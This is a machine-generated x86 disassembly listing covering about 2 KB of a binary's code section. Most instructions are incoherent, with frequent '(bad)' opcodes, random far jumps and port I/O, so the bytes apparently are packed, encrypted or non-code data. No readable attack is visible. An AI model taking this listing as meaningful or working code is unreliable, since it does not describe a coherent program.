  415297:	jl     0x415263
  415299:	scas   al,BYTE PTR es:[edi]
  41529a:	out    dx,al
  41529b:	int    0x25
  41529d:	fwait
  41529e:	adc    eax,eax
  4152a0:	popa   
  4152a1:	pop    ss
  4152a2:	les    esi,FWORD PTR [esi]
  4152a4:	aaa    
  4152a5:	mov    ebx,0x210ea58d
  4152aa:	cmp    DWORD PTR [edx+0x60],edx
  4152ad:	clc    
  4152ae:	push   0x4d
  4152b0:	and    ecx,0x1796e486
  4152b6:	frstor [edi-0x27]
  4152b9:	mov    ds:0x1d5a2dab,al
  4152be:	leave  
  4152bf:	(bad)  
  4152c1:	aam    0xca
  4152c3:	les    edi,FWORD PTR [ecx]
  4152c5:	jae    0x415305
  4152c7:	jmp    0x3fa5:0xc460d45
  4152ce:	scas   al,BYTE PTR es:[edi]
  4152cf:	add    ah,cl
  4152d1:	out    0xe,al
  4152d3:	arpl   WORD PTR gs:[esi-0x35a00c3e],cx
  4152da:	jg     0x41530b
  4152dc:	cmp    DWORD PTR [esi],0xffffffa5
  4152df:	adc    DWORD PTR [eax-0x12],0x6a
  4152e3:	sub    ch,BYTE PTR [edx]
  4152e5:	jno    0x41534c
  4152e7:	popf   
  4152e8:	pop    eax
  4152e9:	sbb    dh,dl
  4152eb:	sub    dl,al
  4152ed:	xor    BYTE PTR [ebx-0x5f],bh
  4152f0:	sbb    eax,0xbe1f45b6
  4152f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152f6:	jecxz  0x4152bb
  4152f8:	in     al,0x88
  4152fa:	inc    esp
  4152fb:	mov    ebx,0xaa0b4f4c
  415300:	push   0xffffffe3
  415302:	pop    ecx
  415303:	push   ebx
  415304:	mov    ebp,0xa91ba2b5
  415309:	lock adc eax,0xdc4348da
  41530f:	nop
  415310:	cmp    al,ch
  415312:	or     al,0x1f
  415314:	je     0x415335
  415316:	test   eax,0xe49007a6
  41531b:	daa    
  41531c:	mov    dl,0x67
  41531e:	sub    DWORD PTR [ecx+0x59],ebp
  415321:	jno    0x415361
  415323:	aam    0xda
  415325:	or     eax,0x8cd0e54c
  41532a:	xchg   ebp,eax
  41532b:	and    DWORD PTR [edi-0x45],ecx
  41532e:	jno    0x4152eb
  415330:	jb     0x415328
  415332:	test   ebp,ebp
  415334:	fimul  DWORD PTR [edi]
  415336:	mov    dh,0x2a
  415338:	cld    
  415339:	aaa    
  41533a:	adc    esi,eax
  41533c:	stc    
  41533d:	iret   
  41533e:	add    al,0x5c
  415340:	dec    edi
  415341:	or     cl,BYTE PTR [ecx]
  415343:	dec    eax
  415344:	call   0x680de30e
  415349:	(bad)  
  41534a:	or     DWORD PTR [esi],ebp
  41534c:	adc    edi,DWORD PTR [edi+esi*8]
  41534f:	and    esp,DWORD PTR [esi-0x6e5475ed]
  415355:	push   0x5a83941b
  41535a:	lahf   
  41535b:	pop    ss
  41535c:	add    DWORD PTR [esi],esp
  41535e:	stc    
  41535f:	ds mov bl,0xf5
  415362:	addr16 hlt 
  415364:	imul   ecx,DWORD PTR [ebx],0xa80be7cd
  41536a:	xor    ecx,DWORD PTR [edx+0x62]
  41536d:	std    
  41536e:	stos   DWORD PTR es:[edi],eax
  41536f:	dec    ecx
  415370:	sti    
  415371:	in     eax,0x5c
  415373:	dec    ebp
  415374:	and    eax,0x776302dc
  415379:	dec    edi
  41537a:	adc    eax,0xbb848cd
  41537f:	int    0xa
  415381:	call   0x173cb941
  415386:	push   ebx
  415387:	js     0x41535d
  415389:	and    eax,0xe93ecd76
  41538e:	mov    dh,0x58
  415390:	idiv   DWORD PTR ds:[ecx]
  415393:	pop    ss
  415394:	pushf  
  415395:	daa    
  415396:	cmp    ah,dh
  415398:	add    ebx,DWORD PTR [ebp+0x432c91e9]
  41539e:	nop
  41539f:	sub    BYTE PTR [esp+eiz*2+0x17],al
  4153a3:	push   eax
  4153a4:	mul    dl
  4153a6:	retf   0x6d57
  4153a9:	sub    BYTE PTR [esi-0x34236a7d],0x9f
  4153b0:	jmp    0x41538f
  4153b2:	rcl    DWORD PTR [esi],0x8e
  4153b5:	pop    ds
  4153b6:	inc    eax
  4153b7:	sub    eax,0x6a41e44c
  4153bc:	in     eax,dx
  4153bd:	xor    BYTE PTR ds:0xbb084e9,dh
  4153c3:	cld    
  4153c4:	je     0x415362
  4153c6:	adc    eax,0xbdc48a3c
  4153cb:	(bad)  
  4153cc:	popa   
  4153cd:	mov    ebx,DWORD PTR [ebx]
  4153cf:	mov    ebx,0x7125f2d4
  4153d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153d5:	push   edx
  4153d6:	out    0x46,al
  4153d8:	mov    edx,0x5060949f
  4153dd:	sub    eax,0x47da5c31
  4153e2:	and    dh,BYTE PTR ds:0x749afb30
  4153e8:	xlat   BYTE PTR ds:[ebx]
  4153e9:	fidiv  WORD PTR [ebp+0x1893399a]
  4153ef:	mov    dh,0xfe
  4153f1:	out    0x24,al
  4153f3:	sbb    BYTE PTR [ecx+0xd],0x38
  4153f7:	push   0x95e94c26
  4153fc:	jae    0x41546e
  4153fe:	sub    al,0xce
  415400:	push   ss
  415401:	dec    eax
  415402:	adc    DWORD PTR [ecx+edi*8],edx
  415405:	pop    ds
  415406:	pop    ebx
  415407:	je     0x4153e2
  415409:	cld    
  41540a:	pop    esp
  41540b:	push   edx
  41540c:	jnp    0x4153c6
  41540e:	mov    cs,WORD PTR [edx]
  415410:	or     eax,0xda886d51
  415415:	adc    cl,BYTE PTR [ecx+0x31]
  415418:	pop    ecx
  415419:	ret    0x1e2a
  41541c:	add    edi,DWORD PTR [edx-0x53ff226e]
  415422:	mov    ds:0xeef851e1,eax
  415427:	adc    eax,0x7685f3d0
  41542c:	mov    ds:0x688c9aec,al
  415431:	imul   eax,esi,0xcd9e5860
  415437:	test   DWORD PTR [ecx+ecx*8],esi
  41543a:	and    ebp,DWORD PTR [eax]
  41543c:	mov    al,ds:0xda192fb7
  415441:	repnz ror cl,cl
  415444:	mov    ebp,0x2d5bfa8c
  415449:	jnp    0x415499
  41544b:	pop    esp
  41544c:	into   
  41544d:	xor    al,0x72
  41544f:	jmp    0x4154b2
  415451:	pop    ss
  415452:	mov    al,ds:0x2ae07f4c
  415457:	push   eax
  415458:	cmp    eax,0xc51dd13c
  41545d:	out    0x78,al
  41545f:	and    bh,BYTE PTR [esi-0x7c20753e]
  415465:	push   0xdc7a5be5
  41546a:	pop    edx
  41546b:	test   eax,0x7b83f22a
  415470:	in     eax,0x27
  415472:	xchg   DWORD PTR [eax+ecx*2-0x2a84689a],ebx
  415479:	adc    DWORD PTR [esi-0x53],ebx
  41547c:	mov    ds:0x86794b3d,eax
  415481:	xchg   edx,eax
  415482:	scas   eax,DWORD PTR es:[edi]
  415483:	inc    edx
  415484:	lahf   
  415485:	xor    ah,BYTE PTR [edx+0x7f0de3af]
  41548b:	fisub  DWORD PTR [eax+0x6ad3101c]
  415491:	js     0x415446
  415493:	sub    cl,BYTE PTR [ecx+0x34054441]
  415499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41549a:	sub    ch,ah
  41549c:	jmp    0x4154bd
  41549e:	jne    0x4154f9
  4154a0:	xchg   edi,eax
  4154a1:	mov    ah,0x54
  4154a3:	dec    esp
  4154a4:	inc    esp
  4154a5:	out    dx,al
  4154a6:	adc    BYTE PTR [esi+edi*4-0x634bdfce],0xf2
  4154ae:	out    0xce,al
  4154b0:	stos   DWORD PTR es:[edi],eax
  4154b1:	mov    ch,BYTE PTR [edx]
  4154b3:	stos   DWORD PTR es:[edi],eax
  4154b4:	scas   eax,DWORD PTR es:[edi]
  4154b5:	int3   
  4154b6:	inc    edi
  4154b7:	rcr    DWORD PTR [esi],1
  4154b9:	pop    edi
  4154ba:	xchg   BYTE PTR [eax],bh
  4154bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154bd:	jp     0x41544d
  4154bf:	fsubp  st(7),st
  4154c1:	fidivr DWORD PTR [edx-0x75]
  4154c4:	arpl   WORD PTR [ebp-0x52],di
  4154c7:	repz xor eax,0xe9584230
  4154cd:	inc    edi
  4154ce:	inc    ebp
  4154cf:	sbb    DWORD PTR [ecx+eiz*2-0x60],ecx
  4154d3:	adc    bh,BYTE PTR es:[ebx]
  4154d6:	mov    al,ds:0x1ecf3618
  4154db:	pop    ds
  4154dc:	push   eax
  4154dd:	cmp    cl,BYTE PTR [eax+edi*1-0x77]
  4154e1:	(bad)  [ebx-0x31]
  4154e4:	cs push esp
  4154e6:	xchg   ebx,eax
  4154e7:	mov    ebx,0xbdd1f173
  4154ec:	sahf   
  4154ed:	clc    
  4154ee:	dec    edi
  4154ef:	into   
  4154f0:	hlt    
  4154f1:	push   ss
  4154f2:	pop    ecx
  4154f3:	lock jl 0x4154d1
  4154f6:	(bad)  
  4154f8:	inc    ebp
  4154f9:	mov    al,ds:0x6d682670
  4154fe:	xchg   dl,ah
  415500:	xor    ebx,ecx
  415502:	(bad)  
  415504:	jno    0x415579
  415506:	leave  
  415507:	arpl   WORD PTR [ebp-0xa02ea8c],bp
  41550d:	out    0xab,al
  41550f:	repz or BYTE PTR ds:0xb292758d,cl
  415516:	jg     0x415528
  415518:	icebp  
  415519:	aas    
  41551a:	sbb    BYTE PTR [esi+0x6e],bh
  41551d:	fisub  DWORD PTR [edx]
  41551f:	xchg   ecx,eax
  415520:	xor    al,0x6a
  415522:	dec    esp
  415523:	adc    eax,0xd90c2087
  415528:	push   cs
  415529:	ds xchg esi,eax
  41552b:	dec    ebx
  41552c:	sbb    esi,DWORD PTR [edi]
  41552e:	loopne 0x4154d7
  415530:	jbe    0x41552c
  415532:	jmp    0x6c7d:0x6d2be7e5
  415539:	test   eax,0x2de1f771
  41553e:	and    ch,ch
  415540:	cmp    al,0xfd
  415542:	(bad)  
  415543:	in     al,0xd
  415545:	adc    BYTE PTR [edx],ch
  415547:	and    eax,0x5d812750
  41554c:	std    
  41554d:	leave  
  41554e:	adc    DWORD PTR [ebx+0x62],ecx
  415551:	mov    ebp,?
  415553:	js     0x4155ba
  415555:	pop    ebx
  415556:	dec    ebp
  415557:	inc    eax
  415558:	sbb    eax,0x6f2c815f
  41555d:	pop    edi
  41555e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41555f:	call   0x89da:0x7092d481
  415566:	jnp    0x41558f
  415568:	xlat   BYTE PTR ds:[ebx]
  415569:	pushf  
  41556a:	push   ss
  41556b:	stc    
  41556c:	jbe    0x415549
  41556e:	or     ax,0xc171
  415572:	test   eax,0x65331f63
  415577:	loop   0x4155bf
  415579:	ret    
  41557a:	ror    dh,1
  41557c:	outs   dx,DWORD PTR ds:[esi]
  41557d:	lea    edi,[ecx]
  41557f:	pop    edi
  415580:	xchg   BYTE PTR ds:0x18f33323,bl
  415586:	jp     0x415596
  415588:	push   0x2e
  41558a:	fcomp  QWORD PTR [esi-0xc]
  41558d:	sub    BYTE PTR [ecx],0xb9
  415590:	jmp    0x9d1556b7
  415595:	jg     0x415547
  415597:	popa   
  415598:	js     0x4155e1
  41559a:	stc    
  41559b:	push   cs
  41559c:	in     al,dx
  41559d:	pop    es
  41559e:	jge    0x415532
  4155a0:	jecxz  0x415597
  4155a2:	dec    esi
  4155a3:	test   al,0xf2
  4155a5:	daa    
  4155a6:	xor    al,0xe9
  4155a8:	adc    DWORD PTR [ebx+0x3f],ebx
  4155ab:	jmp    0x415561
  4155ad:	add    BYTE PTR [ebx+ecx*8-0x3b],cl
  4155b1:	fadd   DWORD PTR [ecx+0x383eb306]
  4155b7:	lods   eax,DWORD PTR ds:[esi]
  4155b8:	in     al,dx
  4155b9:	fisttp DWORD PTR [eax]
  4155bb:	icebp  
  4155bc:	pop    ecx
  4155bd:	xchg   BYTE PTR [eax],cl
  4155bf:	or     al,0xb5
  4155c1:	test   eax,eax
  4155c3:	arpl   WORD PTR [edi+0x6f09c2b0],ax
  4155c9:	inc    eax
  4155ca:	ds xchg esi,eax
  4155cc:	mov    cl,0x29
  4155ce:	pop    ds
  4155cf:	cmp    BYTE PTR [eax+0xf],cl
  4155d2:	jns    0x4155a9
  4155d4:	dec    eax
  4155d5:	dec    ebx
  4155d6:	cdq    
  4155d7:	daa    
  4155d8:	popa   
  4155d9:	ins    BYTE PTR es:[edi],dx
  4155da:	or     BYTE PTR [esi],cl
  4155dc:	arpl   WORD PTR [edx+eax*4+0x7d],bp
  4155e0:	mov    ds:0xbb908cfc,eax
  4155e5:	leave  
  4155e6:	(bad)  
  4155e7:	xlat   BYTE PTR ds:[ebx]
  4155e8:	mov    dl,0xf8
  4155ea:	mov    edi,edi
  4155ec:	xor    BYTE PTR [edi],0x3
  4155ef:	fdiv   DWORD PTR [eax-0x22]
  4155f2:	mov    cl,0xb2
  4155f4:	mov    esi,0xa806f7b6
  4155f9:	mov    bl,0x73
  4155fb:	jle    0x4155c4
  4155fd:	(bad)  
  4155fe:	adc    BYTE PTR [edx-0x14],cl
  415601:	test   DWORD PTR ds:0x3505b285,edi
  415607:	mov    edi,0x435d455
  41560c:	add    eax,0xcd39442a
  415611:	mov    ds:0x25a809f,eax
  415616:	jmp    0x415691
  415618:	mov    ch,0xc4
  41561a:	fwait
  41561b:	and    eax,0x5a8c9bb5
  415621:	sbb    BYTE PTR [ebx-0x14cb3e98],dl
  415627:	int    0x9
  415629:	loope  0x415643
  41562b:	ret    0x3fb3
  41562e:	cmp    esp,DWORD PTR [eiz*2-0x5f538fb5]
  415635:	popf   
  415636:	jl     0x4156ad
  415638:	jae    0x4155f2
  41563a:	inc    esi
  41563b:	call   0xbc10ab1
  415640:	test   BYTE PTR [edi+0x7f],bl
  415643:	xchg   DWORD PTR [ebp-0x7c4ead40],ebp
  415649:	arpl   WORD PTR [ebx-0x7d],bp
  41564c:	addr16 pop esp
  41564e:	test   DWORD PTR [ebp+0x16],ebp
  415651:	ret    
  415652:	int3   
  415653:	fidivr DWORD PTR [ecx+0x16]
  415656:	ja     0x4155ef
  415658:	mov    ebp,0xe650fb82
  41565d:	repz out dx,eax
  41565f:	ret    
  415660:	and    BYTE PTR [eax],cl
  415662:	sar    BYTE PTR [eax-0x4a],1
  415665:	cmp    BYTE PTR [ebx+0x20],cl
  415668:	ror    DWORD PTR [esp+esi*8+0x56],cl
  41566c:	(bad)
  41566f:	adc    ebp,DWORD PTR [ecx-0x32bb80d8]
  415675:	out    0x2,eax
  415677:	add    BYTE PTR [eax*1+0x77c3d0ed],dl
  41567e:	fwait
  41567f:	adc    dl,0x16
  415682:	in     al,0x5d
  415684:	arpl   WORD PTR [esi+0x7d],bp
  415687:	mov    dh,0xc
  415689:	xor    dl,cl
  41568b:	outs   dx,DWORD PTR ds:[esi]
  41568c:	stos   DWORD PTR es:[edi],eax
  41568d:	int    0x12
  41568f:	sbb    DWORD PTR [esi+0x162c4e7d],0xfffffff2
  415696:	pushf  
  415697:	xchg   edi,eax
  415698:	inc    ebp
  415699:	and    esp,DWORD PTR [edx]
  41569b:	inc    eax
  41569c:	mov    ebp,0xf1aa4a5b
  4156a1:	mov    ah,0xb6
  4156a3:	mov    bl,0x1d
  4156a5:	pop    ecx
  4156a6:	data16 jno 0x41565a
  4156a9:	xor    DWORD PTR [esi],eax
  4156ab:	loop   0x415638
  4156ad:	sbb    al,0xdc
  4156af:	mov    eax,ds:0x8f6224b4
  4156b4:	jb     0x4156ea
  4156b6:	jp     0x415670
  4156b8:	mov    BYTE PTR [ecx-0x2f],dl
  4156bb:	jnp    0x41569a
  4156bd:	adc    eax,esp
  4156bf:	mov    edx,0xbb9b91ad
  4156c4:	dec    esi
  4156c5:	and    DWORD PTR [edi-0x6ed07c99],0xffffffb0
  4156cc:	mov    ds:0x5a52bd67,eax
  4156d1:	push   ebp
  4156d2:	adc    BYTE PTR [edx+0x43cb7eb2],bl
  4156d8:	push   ecx
  4156d9:	sub    al,0x51
  4156db:	call   0xea73:0xd0307807
  4156e2:	icebp  
  4156e3:	xchg   ecx,eax
  4156e4:	ins    BYTE PTR es:[edi],dx
  4156e5:	sub    ecx,DWORD PTR [edx+0x3ff01f80]
  4156eb:	int    0x33
  4156ed:	adc    al,0x7c
  4156ef:	mov    ebx,DWORD PTR [eax]
  4156f1:	aam    0xe3
  4156f3:	push   es
  4156f4:	xchg   edx,eax
  4156f5:	push   edi
  4156f6:	ins    DWORD PTR es:[edi],dx
  4156f7:	loop   0x415753
  4156f9:	pop    esp
  4156fa:	pop    edi
  4156fb:	sbb    edi,edx
  4156fd:	pop    DWORD PTR [ebx]
  4156ff:	dec    edx
  415700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415701:	sti    
  415702:	sbb    eax,0x17b05b72
  415707:	fnsave [ebx-0x59]
  41570a:	cmp    dl,BYTE PTR [esi]
  41570c:	fdiv   DWORD PTR [edx]
  41570e:	push   ebp
  41570f:	outs   dx,DWORD PTR ds:[esi]
  415710:	jg     0x4156a0
  415712:	xchg   ecx,eax
  415713:	test   eax,0x2f7b4b89
  415718:	xor    ecx,DWORD PTR [ecx+0x50227361]
  41571e:	outs   dx,BYTE PTR ds:[esi]
  41571f:	fs and eax,0xe598aa12
  415725:	cwde   
  415726:	lea    dx,[eax-0x182c3a34]
  41572d:	outs   dx,DWORD PTR ds:[esi]
  41572e:	jnp    0x41574d
  415730:	jb     0x41579f
  415732:	ss inc esp
  415734:	arpl   bp,di
  415736:	xor    eax,0xefe28394
  41573b:	ja     0x41571a
  41573d:	xchg   ebp,eax
  41573e:	fs push cs
  415740:	mov    WORD PTR [edx+eiz*1-0x24],?
  415744:	jmp    0xb7b24549
  415749:	leave  
  41574a:	call   edx
  41574c:	stc    
  41574d:	xchg   ecx,eax
  41574e:	lea    eax,[edx+esi*2-0x64]
  415752:	cmp    esi,esp
  415754:	inc    edx
  415755:	dec    ebp
  415756:	loope  0x4157cd
  415758:	jb     0x4156e7
  41575a:	pusha  
  41575b:	add    ch,BYTE PTR [ecx-0x20]
  41575e:	bswap  esi
  415760:	inc    edx
  415761:	mov    ds:0x8e5e72a1,al
  415766:	fdiv   DWORD PTR [eax]
  415768:	dec    ecx
  415769:	xor    ah,BYTE PTR [ecx-0x1e9ed6fb]
  41576f:	(bad)  
  415770:	dec    esp
  415771:	gs repnz mov ebx,cs
  415775:	mov    cl,0xb
  415777:	gs push 0xffffffd8
  41577a:	or     cl,BYTE PTR [ecx]
  41577c:	repz (bad)
  41577f:	mov    ecx,0x5c355dcf
  415784:	leave  
  415785:	push   esp
  415786:	mov    ebx,0xf2662be
  41578b:	clc    
  41578c:	fdivr  DWORD PTR ds:0xa366307
  415792:	mov    ah,0xb8
  415794:	cli    
  415795:	(bad)  [ebp-0xa]
  415798:	std    
  415799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41579a:	cmc    
  41579b:	dec    ebp
  41579c:	sbb    BYTE PTR [edx-0x22],0x67
  4157a0:	xchg   edi,eax
  4157a1:	and    ebp,DWORD PTR [ebp+0x74]
  4157a4:	mov    bh,0x91
  4157a6:	jne    0x4157d4
  4157a8:	cs and ch,bl
  4157ab:	xchg   esi,eax
  4157ac:	mov    dl,0xb2
  4157ae:	inc    edi
  4157af:	and    eax,0x4c3faeab
  4157b4:	cmp    BYTE PTR [ebp+0x56],cl
  4157b7:	sub    eax,0xc0856735
  4157bc:	repz jmp 0x415834
  4157bf:	cmc    
  4157c0:	sbb    DWORD PTR [ebx+edi*4],edi
  4157c3:	aas    
  4157c4:	mov    esi,edi
  4157c6:	push   ebp
  4157c7:	xor    edi,DWORD PTR [ebx-0xb31dc9f]
  4157cd:	in     al,0x24
  4157cf:	xchg   ecx,eax
  4157d0:	adc    ah,dl
  4157d2:	add    dh,BYTE PTR ds:0xb901352
  4157d8:	or     BYTE PTR [ecx+ebx*8],ah
  4157db:	sub    BYTE PTR [edx-0x8cc5e30],bh
  4157e1:	mov    al,ds:0x99eb2625
  4157e6:	adc    DWORD PTR [eax],0x1e
  4157e9:	cmp    DWORD PTR [esi],ecx
  4157eb:	je     0x415798
  4157ed:	inc    edi
  4157ee:	inc    ebx
  4157ef:	mov    edi,0xc2fc3f0c
  4157f4:	out    dx,al
  4157f5:	retf   
  4157f6:	retf   0x38c8
  4157f9:	sbb    BYTE PTR [eax-0x55b235b5],bh
  4157ff:	in     al,dx
  415800:	in     eax,0x61
  415802:	jp     0x4157ee
  415804:	pop    es
  415805:	mov    dh,0xc0
  415807:	jno    0x4157a1
  415809:	ss stos DWORD PTR es:[edi],eax
  41580b:	sbb    al,0x36
  41580d:	xor    bh,BYTE PTR [esi+0x570d37e]
  415813:	and    DWORD PTR [edi+0x72],0x90c1e9
  41581a:	dec    esi
  41581b:	dec    ebx
  41581c:	daa    
  41581d:	dec    esp
  41581e:	sbb    dl,BYTE PTR [ecx-0x71de6822]
  415824:	fwait
  415825:	mov    bl,0x16
  415827:	lds    esp,FWORD PTR ds:0x70b9989b
  41582d:	or     al,0xde
  41582f:	aaa    
  415830:	or     dh,bh
  415832:	cmp    eax,0x11487946
  415837:	hlt    
  415838:	in     al,dx
  415839:	fadd   st,st(5)
  41583b:	push   ebx
  41583c:	not    DWORD PTR [ecx+0x298201f0]
  415842:	pop    eax
  415843:	mov    cl,BYTE PTR [ecx+0x3c]
  415846:	out    dx,al
  415847:	fmul   DWORD PTR [edi+0x78305104]
  41584d:	je     0x415862
  41584f:	jne    0x415802
  415851:	cmp    DWORD PTR [ecx],edx
  415853:	sbb    eax,0xc1e39850
  415858:	(bad)  
  415859:	call   0xb4c376df
  41585e:	repz test DWORD PTR [esi-0x38],ebx
  415862:	sub    eax,0xa35c1326
  415867:	mov    ch,0x4e
  415869:	add    dl,ch
  41586b:	sbb    cl,ch
  41586d:	dec    eax
  41586e:	mov    eax,ds:0xe72e2b6e
  415873:	ja     0x4158e1
  415875:	es test al,0x57
  415878:	adc    DWORD PTR [edi-0x2e],0x453117ad
  41587f:	(bad)  
  415880:	(bad)  
  415881:	xor    edx,esp
  415883:	jae    0x4158c5
  415885:	jmp    0x19d133f
  41588a:	sbb    edx,DWORD PTR [ecx+ebx*2]
  41588d:	mov    ecx,0x1e0159bc
  415892:	sar    DWORD PTR [eax+0x4a3c4eaa],1
  415898:	mov    cl,0xfd
  41589a:	fistp  WORD PTR [ecx]
  41589c:	pop    ebx
  41589d:	mov    eax,0x8bd731ec
  4158a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a3:	xchg   DWORD PTR [edi],ecx
  4158a5:	sti    
  4158a6:	push   edx
  4158a7:	scas   al,BYTE PTR es:[edi]
  4158a8:	pop    ecx
  4158a9:	test   DWORD PTR [ebx+0x7b5a6192],esp
  4158af:	push   cs
  4158b0:	and    edi,DWORD PTR [esi-0x4]
  4158b3:	mov    bl,0x47
  4158b5:	lods   eax,DWORD PTR ds:[esi]
  4158b6:	(bad)  
  4158b7:	sub    ebx,edx
  4158b9:	sbb    esp,DWORD PTR [eax]
  4158bb:	mov    edi,0x6ade0cf0
  4158c0:	repnz test al,0x84
  4158c3:	mov    ch,0x27
  4158c5:	and    eax,0xa6a0107
  4158ca:	push   ds
  4158cb:	leave  
  4158cc:	iret   
  4158cd:	shl    DWORD PTR [edi+0x38],0xd8
  4158d1:	push   es
  4158d2:	add    DWORD PTR [ebp-0x70],eax
  4158d5:	adc    BYTE PTR [esi],dh
  4158d7:	arpl   di,si
  4158d9:	jo     0x415905
  4158db:	or     cl,BYTE PTR [edi-0x7e1a003c]
  4158e1:	push   ebp
  4158e2:	jmp    0x5a91:0x24932f3b
  4158e9:	cmp    esi,DWORD PTR [esi+0x7e]
  4158ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ed:	mov    ah,0x70
  4158ef:	addr16 mov esi,0xee67658a
  4158f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158f6:	(bad)  
  4158f7:	(bad)
  4158fa:	stc    
  4158fb:	and    al,0x5e
  4158fd:	repnz adc DWORD PTR [ebx],edx
  415900:	or     cl,BYTE PTR [edx-0x3c0c9d3e]
  415906:	test   ebp,edi
  415908:	out    dx,eax
  415909:	adc    eax,0x3842de0c
  41590e:	lods   al,BYTE PTR ds:[esi]
  41590f:	stos   DWORD PTR es:[edi],eax
  415910:	inc    esp
  415911:	xor    ebp,edx
  415913:	jge    0x4158d1
  415915:	in     al,dx
  415916:	fidivr WORD PTR [ebx-0x24]
  415919:	mov    edx,0x4f32220a
  41591e:	mov    al,BYTE PTR [edi]
  415920:	mov    ecx,0xfb7db1e0
  415925:	loopne 0x41599f
  415927:	pop    ecx
  415928:	mov    bh,0x75
  41592a:	inc    edi
  41592b:	mov    eax,0xd0b01cac
  415930:	nop
  415931:	inc    esi
  415932:	(bad)  [ecx-0x51bb9328]
  415938:	xor    BYTE PTR ds:[esi],bh
  41593b:	cmp    al,0x11
  41593d:	ins    DWORD PTR es:[edi],dx
  41593e:	cmp    DWORD PTR [ebx+0x67],edi
  415941:	or     DWORD PTR [ebx-0x47571e26],eax
  415947:	in     eax,dx
  415948:	shr    esi,0xb8
  41594b:	push   edi
  41594c:	or     eax,0x7ed1b1e7
  415951:	xor    eax,0xd8a777c0
  415956:	or     eax,0xf355fffc
  41595b:	fwait
  41595c:	xchg   edi,eax
  41595d:	stos   BYTE PTR es:[edi],al
  41595e:	jmp    0x4158ea
  415960:	pop    ebx
  415961:	xor    dl,0xd9
  415964:	test   BYTE PTR [edx-0x1a71575a],bh
  41596a:	mov    cl,0x13
  41596c:	repz mov ebp,0xb4b1de3a
  415972:	push   ebp
  415973:	repz mov ?,WORD PTR [ebx+0x7c]
  415977:	push   es
  415978:	(bad)  
  415979:	lds    eax,FWORD PTR [edi-0x2b]
  41597c:	cmp    ah,al
  41597e:	stos   DWORD PTR es:[edi],eax
  41597f:	sti    
  415980:	sbb    ebp,esp
  415982:	adc    DWORD PTR [ebx],edi
  415984:	pop    ebp
  415985:	gs add al,0x4d
  415988:	xchg   ebx,eax
  415989:	sub    ebp,DWORD PTR [edx]
  41598b:	repz or DWORD PTR [ebp-0xa],ecx
  41598f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415990:	gs rcr cl,0xed
  415994:	daa    
  415995:	jmp    0x415a0e
  415997:	xor    eax,0x98ab024e
  41599c:	retf   
  41599d:	pop    edx
  41599e:	sar    DWORD PTR [eax-0x79],cl
  4159a1:	ret    0x5301
  4159a4:	retf   0xe963
  4159a7:	jecxz  0x415954
  4159a9:	adc    eax,0x211e665d
  4159ae:	outs   dx,BYTE PTR ds:[esi]
  4159af:	js     0x415996
  4159b1:	(bad)  
  4159b2:	jne    0x415a30
  4159b4:	push   ebp
  4159b5:	xor    BYTE PTR [edi-0xc],ah
  4159b8:	mov    ebp,0x801745bd
  4159bd:	xchg   ebp,eax
  4159be:	jmp    0x79d0:0xaa8143e1
  4159c5:	pop    esp
  4159c6:	inc    esp
  4159c7:	pop    ebp
  4159c8:	sub    dh,bl
  4159ca:	cld    
  4159cb:	mov    eax,ds:0xddc236f1
  4159d0:	mov    esi,0x48a62ed8
  4159d5:	xchg   edi,eax
  4159d6:	adc    ebx,DWORD PTR [eax+0x7e]
  4159d9:	test   BYTE PTR [eax+ecx*1-0x4c],cl
  4159dd:	fcom   QWORD PTR [ecx+0x1dcad32b]
  4159e3:	xor    DWORD PTR [ebx],ebx
  4159e5:	call   0x44745859
  4159ea:	and    dl,dh
  4159ec:	loope  0x4159b4
  4159ee:	or     bl,dl
  4159f0:	mov    bl,0x65
  4159f2:	retf   0xf38e
  4159f5:	fisub  WORD PTR [esi]
  4159f7:	imul   ecx,DWORD PTR [edx-0x57],0x3cabfe31
  4159fe:	push   esp
  4159ff:	push   ebx
  415a00:	mul    DWORD PTR [edi+0x68ca6ac1]
  415a06:	cmp    al,0x14
  415a08:	dec    edi
  415a09:	rcr    ebp,1
  415a0b:	mul    DWORD PTR [ebp-0x8e1d5f7]
  415a11:	dec    edi
  415a12:	sub    BYTE PTR [eax-0x67a56b8f],0x8a
  415a19:	int    0x69
  415a1b:	and    bl,BYTE PTR [edi+0x1d]
  415a1e:	pop    edx
  415a1f:	shl    DWORD PTR [edi-0x67],1
  415a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a23:	not    DWORD PTR [ebx+0x2b]
  415a26:	sub    dl,BYTE PTR [ebx+0x16b1be62]
  415a2c:	mov    eax,ds:0xee4b142d
  415a31:	ss popf 
  415a33:	pushf  
  415a34:	add    DWORD PTR [ebp+0x72],esp
  415a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a38:	push   edi
  415a39:	cmp    ebx,DWORD PTR [ebx]
  415a3b:	retf   0x6a5d
  415a3e:	hlt    
  415a3f:	call   0x8e5252f7
  415a44:	adc    cl,BYTE PTR [ebx+0x13]
  415a47:	mov    edx,0xc59824e3
  415a4c:	sub    eax,DWORD PTR [ecx+ebx*2-0x5d12e82b]
  415a53:	int3   
  415a54:	adc    eax,0x850d64f5
  415a59:	ja     0x4159fd
  415a5b:	pop    ebp
  415a5c:	sbb    al,0xe5
  415a5e:	sub    bh,ah
  415a60:	call   0x5e23:0x5bee689f
  415a67:	mov    dh,0x0
  415a69:	int3   
  415a6a:	cmp    ebp,esi
  415a6c:	add    al,0x38
  415a6e:	jae    0x415a3e
  415a70:	shr    ah,cl
  415a72:	or     ebx,esp
  415a74:	loopne 0x415a04
  415a76:	and    bh,dh
  415a78:	addr16 sub ch,ch
  415a7b:	stc    
  415a7c:	push   esi
  415a7d:	loope  0x415acb
  415a7f:	sub    eax,0x1e8bec8b
  415a84:	sar    DWORD PTR [edi-0x61],1
  415a87:	xor    eax,0xe1b712ec
  415a8c:	in     al,0x85
